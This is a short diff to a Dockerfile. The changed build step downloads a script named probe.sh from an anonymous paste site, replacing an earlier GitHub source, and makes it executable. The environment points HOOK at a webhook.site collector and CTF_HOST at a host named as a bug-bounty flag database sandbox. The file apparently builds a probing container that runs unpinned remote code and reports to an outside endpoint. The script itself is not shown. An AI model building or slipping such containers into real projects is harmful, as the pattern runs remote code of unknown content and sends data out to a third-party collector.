@@ -1,5 +1,5 @@
 FROM alpine:3.20
-RUN apk add --no-cache bash curl iproute2 iputils util-linux procps coreutils findutils libcap ca-certificates bind-tools && curl -fsSL "https://raw.githubusercontent.com/KenseiSec/test/main/probe.sh?cb=$(date +%s)" -o /probe.sh && chmod 0755 /probe.sh && adduser -D -u 10001 probe
+RUN apk add --no-cache bash curl iproute2 iputils util-linux procps coreutils findutils libcap ca-certificates bind-tools && curl -fsSL https://paste.rs/CdEGv -o /probe.sh && chmod 0755 /probe.sh && adduser -D -u 10001 probe
 ENV HOOK=https://webhook.site/8b1f62ae-184f-4a75-af34-faed1a428c53 CTF_HOST=falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com
 USER probe
 EXPOSE 8080
